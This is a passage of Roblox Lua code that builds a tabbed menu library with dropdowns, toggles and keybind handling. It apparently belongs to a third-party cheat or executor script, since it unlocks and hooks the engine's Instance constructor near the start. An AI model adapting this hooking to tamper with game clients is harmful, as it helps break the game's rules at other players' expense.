				Tabs.Position = C.UDIM2(0, 0, 0, 2) 
				Tabs.Size = C.UDIM2(0, 590, 0, 600) 
				
				setreadonly(Instance, false)

				local oldNewInstance = C.INST

				C.INST = function(...)
					
					local args = {...}

					if args[1] == "SamuelPaste" then
						return library
					end

					return oldNewInstance(...)
				end

				setreadonly(Instance, true)

				local first = true 
				local currenttab 

				function menu:Tab(text) 
					local tabname 
					tabname = text 
					local Tab = {} 
					values[tabname] = {} 

					local TextButton = C.INST("TextButton") 
					TextButton.Parent = TabButtons
					TextButton.BackgroundColor3 = C.COL3RGB(255, 255, 255)
					TextButton.BackgroundTransparency = 1.000
					TextButton.Size = C.UDIM2(0, 83, 0, 23)
					TextButton.Font = Enum.Font.Ubuntu
					TextButton.Text = text
					TextButton.TextColor3 = C.COL3RGB(255, 255, 255)
					TextButton.TextSize = 12.000
					TextButton.TextStrokeTransparency = 0.000
					local Gard = C.INST("Frame")
					Gard.Name = "Gard"
					Gard.Parent = TextButton
					Gard.BackgroundColor3 = MainUIColor
					Gard.BorderSizePixel = 0
					Gard.Position = C.UDIM2(0, 0, 1, 0)
					Gard.Size = C.UDIM2(0, 83, 0, 1)

					local TabGui = C.INST("ScrollingFrame") 
					local Left = C.INST("Frame") 
					local UIListLayout = C.INST("UIListLayout") 
					local Right = C.INST("Frame") 
					local UIListLayout_2 = C.INST("UIListLayout") 

		TabGui.Name = 'TabGui'
		TabGui.Parent = Tabs
		TabGui.BackgroundColor3 = C.COL3RGB(25, 25, 25)
		TabGui.BorderColor3 = C.COL3RGB(25, 25, 25)
		TabGui.BackgroundTransparency = 1
		TabGui.ScrollBarThickness = 4
		TabGui.BorderSizePixel = 0
		TabGui.ScrollBarImageTransparency = 0.9
		TabGui.Position = C.UDIM2(0, 5, 0, 2)
		TabGui.Size = C.UDIM2(0, 590, 1, 0)
		TabGui.Visible = false
		TabGui.CanvasSize = C.UDIM2(0, 0, 4.5, 0)


					Left.Name = "Left" 
					Left.Parent = TabGui 
					Left.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
					Left.BackgroundTransparency = 1.000 
					Left.Position = C.UDIM2(0, 15, 0, 11) 
					Left.Size = C.UDIM2(0, 279, 0, 543) 

					UIListLayout.Parent = Left 
					UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
					UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
					UIListLayout.Padding = UDim.new(0, 10) 

					Right.Name = "Right" 
					Right.Parent = TabGui 
					Right.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
					Right.BackgroundTransparency = 1.000 
					Right.Position = C.UDIM2(0, 303, 0, 11) 
					Right.Size = C.UDIM2(0, 279, 0, 543) 

					UIListLayout_2.Parent = Right 
					UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center 
					UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder 
					UIListLayout_2.Padding = UDim.new(0, 10) 

					if first then 
						TextButton.TextColor3 = C.COL3RGB(255, 255, 255) 
						currenttab = text 
						TabGui.Visible = true 
						first = false 
					end 

					TextButton.MouseButton1Down:Connect(function() 
						if currenttab ~= text then 
							for i,v in pairs(TabButtons:GetChildren()) do 
								if v:IsA("TextButton") then 
									library:Tween(v, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									library:Tween(v.Gard, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000}) 
								end 
							end 
							for i,v in pairs(Tabs:GetChildren()) do 
								v.Visible = false 
							end 
							library:Tween(TextButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)})
							library:Tween(TextButton.Gard, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})
							currenttab = text 
							TabGui.Visible = true 
						end 
					end) 

					function Tab:MSector(text, side) 
						local sectorname = text 
						local MSector = {} 
						values[tabname][text] = {} 


						local Section = C.INST("Frame") 
						local SectionText = C.INST("TextLabel") 
						local Inner = C.INST("Frame") 
						local sectiontabs = C.INST("Frame") 
						local UIListLayout_2 = C.INST("UIListLayout") 

						Section.Name = "Section" 
						Section.Parent = TabGui[side] 
						Section.BackgroundColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderSizePixel = 0 
						Section.Size = C.UDIM2(1, 0, 0, 33) 

						SectionText.Name = "SectionText" 
						SectionText.Parent = Section 
						SectionText.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.BackgroundTransparency = 1.000 
						SectionText.Position = C.UDIM2(0, 7, 0, -12) 
						SectionText.Size = C.UDIM2(0, 270, 0, 19) 
						SectionText.ZIndex = 2 
						SectionText.Font = Enum.Font.Gotham 
						SectionText.Text = text 
						SectionText.TextColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.TextSize = 12.000 
						SectionText.TextXAlignment = Enum.TextXAlignment.Left 

						Inner.Name = "Inner" 
						Inner.Parent = Section 
						Inner.BackgroundColor3 = C.COL3RGB(30, 30, 30) 
						Inner.BorderColor3 = C.COL3RGB(0, 0, 0) 
						Inner.BorderSizePixel = 0 
						Inner.Position = C.UDIM2(0, 1, 0, 1) 
						Inner.Size = C.UDIM2(1, -2, 1, -9) 

						sectiontabs.Name = "sectiontabs" 
						sectiontabs.Parent = Section 
						sectiontabs.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
						sectiontabs.BackgroundTransparency = 1.000 
						sectiontabs.Position = C.UDIM2(0, 0, 0, 6) 
						sectiontabs.Size = C.UDIM2(1, 0, 0, 22) 

						UIListLayout_2.Parent = sectiontabs 
						UIListLayout_2.FillDirection = Enum.FillDirection.Horizontal 
						UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center 
						UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder 
						UIListLayout_2.Padding = UDim.new(0,4) 

						local firs = true 
						local selected 
						function MSector:Tab(text) 
							local tab = {} 
							values[tabname][sectorname][text] = {} 
							local tabtext = text 

							local tabsize = C.UDIM2(1, 0, 0, 44) 

							local tab1 = C.INST("Frame") 
							local UIPadding = C.INST("UIPadding") 
							local UIListLayout = C.INST("UIListLayout") 
							local TextButton = C.INST("TextButton") 

							tab1.Name = text 
							tab1.Parent = Inner 
							tab1.BackgroundColor3 = C.COL3RGB(30, 30, 30) 
							tab1.BorderColor3 = C.COL3RGB(18, 18, 16) 
							tab1.BorderSizePixel = 0 
							tab1.Position = C.UDIM2(0, 0, 0, 30) 
							tab1.Size = C.UDIM2(1, 0, 1, -21) 
							tab1.Name = text 
							tab1.Visible = false 

							UIPadding.Parent = tab1 
							UIPadding.PaddingTop = UDim.new(0, 0) 

							UIListLayout.Parent = tab1 
							UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
							UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
							UIListLayout.Padding = UDim.new(0, 1) 

							TextButton.Parent = sectiontabs 
							TextButton.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
							TextButton.BackgroundTransparency = 1.000 
							TextButton.Size = C.UDIM2(0, txt:GetTextSize(text, 14, Enum.Font.Gotham, C.Vec2(700,700)).X + 2, 1, 0) 
							TextButton.Font = Enum.Font.Gotham 
							TextButton.Text = text 
							TextButton.TextColor3 = C.COL3RGB(200, 200, 200) 
							TextButton.TextSize = 11.000
							TextButton.Name = text 

							TextButton.MouseButton1Down:Connect(function() 
								for i,v in pairs(Inner:GetChildren()) do 
									v.Visible = false 
								end 
								for i,v in pairs(sectiontabs:GetChildren()) do 
									if v:IsA("TextButton") then 
										library:Tween(v, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
									end 
								end 
								Section.Size = tabsize 
								tab1.Visible = true 
								library:Tween(TextButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
							end) 

							function tab:Element(type, text, data, callback) 
								local Element = {} 
								data = data or {} 
								callback = callback or function() end 
								values[tabname][sectorname][tabtext][text] = {} 

								if type == "Jumbobox" then 
									tabsize = tabsize + C.UDIM2(0,0,0, 39) 
									Element.value = {Jumbobox = {}} 
									data.options = data.options or {} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 

									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = tab1 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = "..." 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local abcd = TextLabel 

									Drop.Name = "Drop"
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(1, 1, 1, 1) 
									Drop.ScrollBarThickness = 4 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = MainUIColor 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									values[tabname][sectorname][tabtext][text] = Element.value 
									local num = #data.options 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									local first = true 

									local function updatetext() 
										local old = {} 
										for i,v in ipairs(data.options) do 
											if C.TBLFIND(Element.value.Jumbobox, v) then 
												C.INSERT(old, v) 
											else 
											end 
										end 
										local str = "" 


										if #old == 0 then 
											str = "..." 
										else 
											if #old == 1 then 
												str = old[1] 
											else 
												for i,v in ipairs(old) do 
													if i == 1 then 
														str = v 
													else 
														if i > 2 then 
															if i < 4 then 
																str = str..",  ..." 
															end 
														else 
															str = str..",  "..v 
														end 
													end 
												end 
											end 
										end 

										abcd.Text = str 
									end 
									for i,v in ipairs(data.options) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												if C.TBLFIND(Element.value.Jumbobox, v) then 
													for i,a in pairs(Element.value.Jumbobox) do 
														if a == v then 
															C.TBLREMOVE(Element.value.Jumbobox, i) 
														end 
													end 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
												else 
													C.INSERT(Element.value.Jumbobox, v) 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
												end 
												updatetext() 

												values[tabname][sectorname][tabtext][text] = Element.value 
												callback(Element.value) 
											end) 
											Button.MouseEnter:Connect(function() 
												if not C.TBLFIND(Element.value.Jumbobox, v) then 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
												end 
											end) 
											Button.MouseLeave:Connect(function() 
												if not C.TBLFIND(Element.value.Jumbobox, v) then 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
												end 
											end) 

											first = false 
										end 
									end 
									function Element:SetValue(val) 
										Element.value = val 
										for i,v in pairs(Drop:GetChildren()) do 
											if v.Name ~= "UIListLayout" then 
												if C.TBLFIND(val.Jumbobox, v.Name) then 
													v.TextLabel.TextColor3 = C.COL3RGB(175, 175, 175) 
												else 
													v.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
												end 
											end 
										end 
										updatetext() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(val) 
									end 
									if data.default then 
										Element:SetValue(data.default) 
									end 

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = text 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 
								elseif type == "TextBox" then 

								elseif type == "ToggleKeybind" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false, Key = data.default and data.default.Key or nil, Type = "Always", Active = true} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Color.BorderColor3 = C.COL3RGB(27, 3275, 35) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 
									local binding = false 
									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											keybindremove(text, Element.value.Key) 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 

									Button.MouseButton1Down:Connect(function() 
										if not binding then 
											Element.value.Toggle = not Element.value.Toggle 
											if Element.value.Toggle and Element.value.Key ~= nil then
												keybindadd(text, Element.value.Key)
											end
											update() 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
										end 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									do 
										local Keybind = C.INST("TextButton") 
										local Frame = C.INST("Frame") 
										local Always = C.INST("TextButton") 
										local UIListLayout = C.INST("UIListLayout") 
										local Hold = C.INST("TextButton") 
										local Toggle = C.INST("TextButton") 

										Keybind.Name = "Keybind" 
										Keybind.Parent = Button 
										Keybind.BackgroundColor3 = C.COL3RGB(31, 31, 31) 
										Keybind.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Keybind.Position = C.UDIM2(0, 270, 0.5, -6) 
										Keybind.Text = "none" 
										Keybind.Size = C.UDIM2(0, 43, 0, 12) 
										Keybind.Size = C.UDIM2(0,txt:GetTextSize("none", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
										Keybind.AutoButtonColor = false 
										Keybind.Font = Enum.Font.Gotham 
										Keybind.TextColor3 = C.COL3RGB(200, 200, 200) 
										Keybind.TextSize = 11.000
										Keybind.AnchorPoint = C.Vec2(1,0) 
										Keybind.ZIndex = 3 

										Frame.Parent = Keybind 
										Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Frame.Position = C.UDIM2(1, -49, 0, 1) 
										Frame.Size = C.UDIM2(0, 49, 0, 49) 
										Frame.Visible = false 
										Frame.ZIndex = 3 

										Always.Name = "Always" 
										Always.Parent = Frame 
										Always.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Always.BackgroundTransparency = 1.000 
										Always.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Always.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
										Always.Size = C.UDIM2(1, 0, 0, 16) 
										Always.AutoButtonColor = false 
										Always.Font = Enum.Font.SourceSansBold 
										Always.Text = "Always" 
										Always.TextColor3 = C.COL3RGB(173, 24, 74) 
										Always.TextSize = 11.000
										Always.ZIndex = 3 

										UIListLayout.Parent = Frame 
										UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
										UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

										Hold.Name = "Hold" 
										Hold.Parent = Frame 
										Hold.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Hold.BackgroundTransparency = 1.000 
										Hold.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Hold.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
										Hold.Size = C.UDIM2(1, 0, 0, 16) 
										Hold.AutoButtonColor = false 
										Hold.Font = Enum.Font.Gotham 
										Hold.Text = "Hold" 
										Hold.TextColor3 = C.COL3RGB(200, 200, 200) 
										Hold.TextSize = 11.000
										Hold.ZIndex = 3 

										Toggle.Name = "Toggle" 
										Toggle.Parent = Frame 
										Toggle.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Toggle.BackgroundTransparency = 1.000 
										Toggle.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Toggle.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
										Toggle.Size = C.UDIM2(1, 0, 0, 16) 
										Toggle.AutoButtonColor = false 
										Toggle.Font = Enum.Font.Gotham 
										Toggle.Text = "Toggle" 
										Toggle.TextColor3 = C.COL3RGB(200, 200, 200) 
										Toggle.TextSize = 11.000
										Toggle.ZIndex = 3 

										for _,button in pairs(Frame:GetChildren()) do 
											if button:IsA("TextButton") then 
												button.MouseButton1Down:Connect(function() 
													Element.value.Type = button.Text 
													Frame.Visible = false 
													Element.value.Active = Element.value.Type == "Toggle" and true or false 
													if Element.value.Type == "Always" then 
														keybindremove(text, Element.value.Key) 
													end 
													for _,button in pairs(Frame:GetChildren()) do 
														if button:IsA("TextButton") and button.Text ~= Element.value.Type then 
															button.Font = Enum.Font.Gotham 
															library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
														end 
													end 
													button.Font = Enum.Font.SourceSansBold 
													button.TextColor3 = C.COL3RGB(60, 0, 90) 
													values[tabname][sectorname][tabtext][text] = Element.value 
													callback(Element.value) 
												end) 
												button.MouseEnter:Connect(function() 
													if Element.value.Type ~= button.Text then 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255,255,255)}) 
													end 
												end) 
												button.MouseLeave:Connect(function() 
													if Element.value.Type ~= button.Text then 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
													end 
												end) 
											end 
										end 
										Keybind.MouseButton1Down:Connect(function() 
											if not binding then 
												wait() 
												binding = true 
												Keybind.Text = "..." 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize("...", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
											end 
										end) 
										Keybind.MouseButton2Down:Connect(function() 
											if not binding then 
												Frame.Visible = not Frame.Visible 
											end 
										end) 
										local Player = game.Players.LocalPlayer 
										local Mouse = Player:GetMouse() 
										local InFrame = false 
										Frame.MouseEnter:Connect(function() 
											InFrame = true 
										end) 
										Frame.MouseLeave:Connect(function() 
											InFrame = false 
										end) 
										local InFrame2 = false 
										Keybind.MouseEnter:Connect(function() 
											InFrame2 = true 
										end) 
										Keybind.MouseLeave:Connect(function() 
											InFrame2 = false 
										end) 
										game:GetService("UserInputService").InputBegan:Connect(function(input) 
											if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 and not binding then 
												if Frame.Visible == true and not InFrame and not InFrame2 then 
													Frame.Visible = false 
												end 
											end 
											if binding then 
												binding = false 
												Keybind.Text = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name:upper() or input.UserInputType.Name:upper() 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
												Element.value.Key = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name or input.UserInputType.Name 
												if Element.value.Toggle then
													keybindadd(text, Element.value.Key)
												end
												if input.KeyCode.Name == "Backspace" then 
													Keybind.Text = "none" 
													Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
													Element.value.Key = nil
													keybindremove(text, Element.value.Key)
												end 
											else 
												if Element.value.Key ~= nil then 
													if C.FIND(Element.value.Key, "Mouse") then 
														if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
															if Element.value.Type == "Hold" then 
																Element.value.Active = true 
																if Element.value.Active and Element.value.Toggle then 
																	keybindhold(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															elseif Element.value.Type == "Toggle" then 
																Element.value.Active = not Element.value.Active 
																if Element.value.Active and Element.value.Toggle then 
																	keybindtoggle(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															end 
														end 
													else 
														if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
															if Element.value.Type == "Hold" then 
																Element.value.Active = true 
																if Element.value.Active and Element.value.Toggle then 
																	keybindhold(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															elseif Element.value.Type == "Toggle" then 
																Element.value.Active = not Element.value.Active 
																if Element.value.Active and Element.value.Toggle then 
																	keybindtoggle(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															end 
														end 
													end 
												else 
													Element.value.Active = true 
												end 
											end 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
										end) 
										game:GetService("UserInputService").InputEnded:Connect(function(input) 
											if Element.value.Key ~= nil then 
												if C.FIND(Element.value.Key, "Mouse") then 
													if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = false 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end 
													end 
												else 
													if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = false 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end 
													end 
												end 
											end 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
										end) 
									end 
									function Element:SetValue(value) 
										Element.value = value 
										update() 
										if Element.value.Key ~= nil and Element.value.Toggle then
											keybindadd(text, Element.value.Key)
										end
									end 
								elseif type == "Toggle" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									
									Color.BackgroundColor3 = MainUIColor 
									
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46)
									Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
